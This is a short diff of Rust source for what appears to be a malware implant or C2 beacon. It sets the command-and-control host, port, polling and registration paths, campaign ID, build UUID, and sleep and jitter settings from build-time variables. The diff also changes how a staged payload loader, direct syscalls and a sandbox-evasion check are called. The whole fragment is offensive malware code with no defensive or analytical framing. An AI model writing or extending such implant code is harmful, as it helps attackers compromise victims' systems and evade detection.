@@ -1,11 +1,11 @@
 use std::time::Duration;
 
-const C2_HOST:       &str = env!("DM_C2_HOST");
-const C2_PORT:       &str = env!("DM_C2_PORT");
-const PATH_POLL:     &str = env!("DM_C2_PATH_POLL");
-const PATH_REGISTER: &str = env!("DM_C2_PATH_REG");
-const CAMPAIGN_ID:   &str = env!("DM_CAMPAIGN_ID");
-const BUILD_UUID:    &str = env!("DM_BUILD_UUID");
+pub const C2_HOST:       &str = env!("DM_C2_HOST");
+pub const C2_PORT:       &str = env!("DM_C2_PORT");
+const PATH_POLL:         &str = env!("DM_C2_PATH_POLL");
+const PATH_REGISTER:     &str = env!("DM_C2_PATH_REG");
+const CAMPAIGN_ID:       &str = env!("DM_CAMPAIGN_ID");
+pub const BUILD_UUID:    &str = env!("DM_BUILD_UUID");
 const SLEEP_SECS:    u64  = const_parse_u64(env!("DM_SLEEP_SECS"));
 const JITTER_PCT:    u64  = const_parse_u64(env!("DM_JITTER_PCT"));
 
@@ -28,10 +28,6 @@ pub struct Session {
 }
 
 pub fn run() {
-    #[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
-    crate::loader::do_staged_load();
-
-    #[cfg(all(target_os = "windows", not(all(feature = "staged-payload", feature = "udrl"))))]
     let _ = crate::syscall::init();
 
     if crate::evasion::abort_if_sandboxed() {
